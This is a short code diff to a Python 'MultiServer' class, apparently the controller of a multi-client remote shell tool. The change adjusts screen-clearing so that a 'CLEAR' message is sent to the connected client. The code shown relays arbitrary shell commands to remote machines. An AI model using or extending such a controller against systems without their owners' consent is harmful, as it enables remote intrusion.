@@ -425,10 +425,10 @@ class MultiServer(object):
                 if _print and system == 'Windows':
                     print()
                 return cwd[0], cwd[0]
-        if command.lower().strip() == 'cls' and platform.system() == 'Windows':
-            return os.system('cls'), self.get_cwd(conn)
-        if command[:5].lower().strip() == 'clear' and platform.system() != 'Windows':
-            return os.system('clear'), self.get_cwd(conn)
+        if command.lower().strip() == 'cls' and self.get_platform(conn) == 'Windows':
+            return self.clear_screen(conn=conn, _print=_print), self.get_cwd(conn)
+        if command[:5].lower().strip() == 'clear' and self.get_platform(conn) != 'Windows':
+            return self.clear_screen(conn=conn, _print=_print), self.get_cwd(conn)
         self.send(conn, json_dumps(['SHELL', command]))
         result = []
         while 1:
@@ -443,6 +443,18 @@ class MultiServer(object):
                     print(output)
             self.send(conn, json_dumps(['LISTENING']))
         return result, self.get_cwd(conn)
+
+    def clear_screen(self, conn=None, _print=True) -> None:
+        """ Clear Screen """
+        if conn != None:
+            self.send(conn, json_dumps(['CLEAR']))
+            self.receive(conn, _print=False)
+        if _print:
+            if platform.system() == 'Windows':
+                _ = os.system('cls')
+            else:
+                _ = os.system('clear')
+        return ''
 
     def get_platform(self, conn) -> str:
         """ Get Client Platform """
